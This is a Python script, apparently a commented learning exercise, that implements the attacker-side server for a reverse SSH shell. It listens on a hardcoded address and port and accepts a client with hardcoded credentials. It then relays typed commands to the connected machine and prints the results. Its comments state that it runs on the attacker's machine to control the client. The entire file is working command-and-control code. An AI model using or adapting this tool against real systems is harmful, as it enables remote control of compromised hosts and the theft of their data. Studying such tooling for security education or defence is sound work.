# SSH server using paramiko that listens for inbound connections, authenticates clients against hardcoded credentials, 
# and provides an interactive command prompt to control a connected client.

import os
import paramiko
import socket
import sys
import threading

# setup
CWD = os.path.dirname(os.path.realpath(__file__)) # pulls the current directory this script is saved in
HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, 'test_rsa.key')) # finds the RSA key to prove identity to the client

# server rules
class Server (paramiko.ServerInterface): # inherits paramiko's ServerInterface, which handles authentication
    def __init__(self):
        self.event = threading.Event() # sets up a threading event object

    def check_channel_request(self, kind, chanid):
        if kind == 'session': 
            return paramiko.OPEN_SUCCEEDED # allows standard session channels
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED # rejects everything that's not 'session'

    # hardcoded credentials that can be changed, doesn't need to be secure since this is running on the attacker's machine
    def check_auth_password(self, username, password):
        if (username == 'john') and (password == 'allard'):
            return paramiko.AUTH_SUCCESSFUL

if __name__ == '__main__':
    # hard coded that can be changed as needed
    server = '192.168.1.207'
    ssh_port = 2222
    try:
        # start the TCP listening
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creates a standard TCP/IP socket
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # configures the socket so the port can be reused if the script is restarted
        sock.bind((server, ssh_port)) # binds the socket to the specified server and port
        sock.listen(100)
        print('[+] Listening for connection ...')
        client, addr = sock.accept() # the code will stop here and wait until a client connects, then saves the client socket object and it's IP/port address
    except Exception as e:
        print('[-] Listen failed: ' + str(e)) # print error message
        sys.exit(1)
    else:
        print('[+] Got a connection!', client, addr)

    # establist the SSH transport layer
    bhSession = paramiko.Transport(client)
    bhSession.add_server_key(HOSTKEY)
    server = Server()
    bhSession.start_server(server=server)

    chan = bhSession.accept(20)
    if chan is None:
        print('*** No channel.')
        sys.exit(1)

    print('[+] Authenticated!')
    print(chan.recv(1024))
    chan.send('Welcome to bh_ssh')
    try:
        while True:
            command= input("Enter command: ")
            if command != 'exit':
                chan.send(command)
                r = chan.recv(8192)
                print(r.decode())
            else:
                chan.send('exit')
                print('exiting')
                bhSession.close()
                break
    except KeyboardInterrupt:
        bhSession.close()
